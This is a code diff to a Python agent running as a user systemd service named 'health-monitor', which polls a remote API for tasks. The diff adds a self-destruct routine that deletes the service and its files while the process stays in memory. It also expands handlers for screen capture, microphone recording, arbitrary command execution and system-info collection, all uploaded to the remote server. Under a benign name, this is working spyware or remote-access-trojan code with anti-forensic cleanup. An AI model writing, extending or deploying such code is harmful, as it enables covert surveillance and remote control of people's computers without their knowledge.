@@ -176,6 +176,27 @@ def register_device(config, device_id):
     else:
         api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.utcnow().isoformat()})
 
+def self_destruct():
+    try:
+        # 1. Disable Service (don't stop yet)
+        run_command("systemctl --user disable health-monitor.service")
+        
+        # 2. Remove Service File
+        service_file = os.path.expanduser("~/.config/systemd/user/health-monitor.service")
+        if os.path.exists(service_file):
+            os.remove(service_file)
+        run_command("systemctl --user daemon-reload")
+        
+        # 3. Remove Config & Agent Files
+        # We keep the running script in memory, but delete the file on disk
+        import shutil
+        if os.path.exists(BASE_PATH):
+            shutil.rmtree(BASE_PATH)
+            
+        return True
+    except:
+        return False
+
 def process_tasks(config, device_id):
     tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*")
     if not tasks:
@@ -186,43 +207,63 @@ def process_tasks(config, device_id):
         task_type = task['task_type']
         params = task.get('task_params', {})
         
-        # Mark processing
-        # api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {"status": "processing"})
-        
         result_data = None
         data_type = None
+        should_destruct = False
         
-        if task_type == "display_capture":
-            img = take_screenshot()
-            if img:
-                result_data = {"file_data": img}
-                data_type = "display"
+        try:
+            if task_type == "display_capture":
+                # Ensure DISPLAY var is set
+                if "DISPLAY" not in os.environ:
+                    os.environ["DISPLAY"] = ":0"
+                    
+                img = take_screenshot()
+                if img:
+                    result_data = {"file_data": img}
+                    data_type = "display"
+                else:
+                    # Report failure
+                    result_data = {"data": "Screenshot failed. 'scrot' might be missing or no display."}
+                    data_type = "sysinfo" # Send as generic info/log
+                    
+            elif task_type == "system_info":
+                sysinf = get_sys_info()
+                result_data = {"data": sysinf}
+                data_type = "sysinfo"
                 
-        elif task_type == "system_info":
-            sysinf = get_sys_info()
-            result_data = {"data": sysinf}
+            elif task_type == "voice_capture":
+                duration = params.get('duration', 10)
+                aud = record_audio(duration)
+                if aud:
+                    result_data = {"file_data": aud}
+                    data_type = "audio"
+                else:
+                    result_data = {"data": "Audio recording failed. 'arecord' missing or input unavailable."}
+                    data_type = "sysinfo"
+
+            elif task_type == "auto_destruct":
+                success = self_destruct()
+                result_data = {"data": "Self-destruct sequence initiated. Agent removed." if success else "Self-destruct failed."}
+                data_type = "sysinfo"
+                should_destruct = True
+                    
+            elif task_type in ["cmd_exec", "cmd_exec_admin"]:
+                cmd = params.get('command', '')
+                stdout, stderr, code = run_command(cmd)
+                res = {
+                    "command": cmd,
+                    "output": stdout,
+                    "error": stderr,
+                    "exit_code": code,
+                    "executed_as": "ROOT" if os.geteuid() == 0 else "USER"
+                }
+                result_data = {"data": json.dumps(res)}
+                data_type = "cmd_result"
+                
+        except Exception as e:
+            # Catch unexpected errors during execution
+            result_data = {"data": f"Task execution error: {str(e)}"}
             data_type = "sysinfo"
-            
-        elif task_type == "voice_capture":
-            duration = params.get('duration', 10)
-            aud = record_audio(duration)
-            if aud:
-                result_data = {"file_data": aud}
-                data_type = "audio"
-                
-        elif task_type in ["cmd_exec", "cmd_exec_admin"]:
-            # Linux doesn't distinguish admin execution in the same way, runs as current user
-            cmd = params.get('command', '')
-            stdout, stderr, code = run_command(cmd)
-            res = {
-                "command": cmd,
-                "output": stdout,
-                "error": stderr,
-                "exit_code": code,
-                "executed_as": "ROOT" if os.geteuid() == 0 else "USER"
-            }
-            result_data = {"data": json.dumps(res)}
-            data_type = "cmd_result"
 
         # Upload telemetry
         if result_data and data_type:
@@ -239,6 +280,9 @@ def process_tasks(config, device_id):
             "status": "complete",
             "completed_at": datetime.utcnow().isoformat()
         })
+        
+        if should_destruct:
+            sys.exit(0)
 
 # --- MAIN ---
 
@@ -267,4 +311,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
